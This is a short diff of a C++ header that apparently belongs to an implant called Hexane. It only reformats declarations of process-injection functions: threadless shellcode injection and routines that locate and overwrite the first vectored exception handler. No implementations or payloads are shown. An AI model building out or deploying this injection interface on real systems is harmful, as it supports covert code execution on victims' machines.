@@ -3,12 +3,22 @@
 #include <core/corelib.hpp>
 
 namespace Injection {
-    FUNCTION VOID Threadless(const _threadless &writer, void *const shellcode, size_t n_shellcode, size_t total);
+    VOID
+    FUNCTION
+        Threadless(CONST THREADLESS &writer, VOID *shellcode, SIZE_T n_shellcode, SIZE_T total);
 
     namespace Veh {
-        FUNCTION UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *const signature, const char *const mask);
-        FUNCTION UINT_PTR PointerEncodeDecode(uintptr_t const &pointer, const bool encode);
-        FUNCTION NTSTATUS OverwriteFirstHandler(_veh_writer const &writer);
+        UINT_PTR
+        FUNCTION
+            GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, CONST CHAR *signature, CONST CHAR *mask);
+
+        UINT_PTR
+        FUNCTION
+            PointerEncodeDecode(UINT_PTR CONST &pointer, BOOL encode);
+
+        NTSTATUS
+        FUNCTION
+            OverwriteFirstHandler(VEH_WRITER CONST &writer);
     }
 }
 #endif //HEXANE_IMPLANT_INJECT_HPP
